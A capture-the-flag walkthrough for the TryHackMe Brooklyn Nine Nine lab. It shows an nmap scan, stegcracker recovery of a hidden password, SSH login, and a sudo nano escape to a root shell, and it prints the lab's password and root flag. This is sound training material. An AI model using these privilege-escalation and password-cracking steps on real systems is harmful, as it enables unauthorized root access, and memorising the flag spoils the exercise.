---
title: "Tryhackme - Brooklyn Nine Nine Walkthrough"
date: 2020-10-18
tags: [tryhackme, walkthrough, linux]
header:
  image: "/images/not-found.gif"
excerpt: "Walkthroughs"
---

# TryHackMe - Brooklyn99 Walkthrough

Hello everyone, today I will explain the walkthrough for Brooklyn99 Virtual Machine from TryHackMe

**TOP KEYWORDS**: #steganography, #steghide, #stegcracker, #sudo privilege escalation, #GTFObins, #sudo root shell

## Information Gathering

Firstly, We start with nmap scanning:

```
root@kali:~/BrooklynNineNine# nmap -p- -T4 -A 10.10.76.41
...
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
...
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
...
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
...
```

We see that we can have **Anonymous FTP session**.

We don't find any exploit for OpenSSH version.

Also I want to investigate the website.

When I viewed the page source of the website I can see that There is some commment ant it said you can try some **steganography**. I download the picture and, firstly, I will try using **steghide**, but I cannot know the passphrase, so I changed my tool and used **stegcracker**.

```
root@kali:~/BrooklynNineNine# stegcracker brooklyn99.jpg 
...
Your file has been written to: brooklyn99.jpg.out
admin
```

Bingo! Our passphrase is _admin_. then I tried to read the comment inside the picture.

```
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

## Exploit

It means that we can have a SSH session.

```
root@kali:~/BrooklynNineNine# ssh holt@10.10.76.41
holt@10.10.76.41's password: 
Permission denied, please try again.
holt@10.10.76.41's password: 
Permission denied, please try again.
holt@10.10.76.41's password: 
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$
```

We find the user flag - _user.txt_.

## Privilege Escalation

Then I will try a privilege escalation. 
```
sudo -l
```

I saw that I can run `nano` using `SUDO`. I use **GTFObins** to find out how can I take root shell.
```
sudo nano
^R^X
reset; sh 1>&0 2>&0
# whoami
root
# cd /root/
# ls
root.txt
# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845
```

Victory!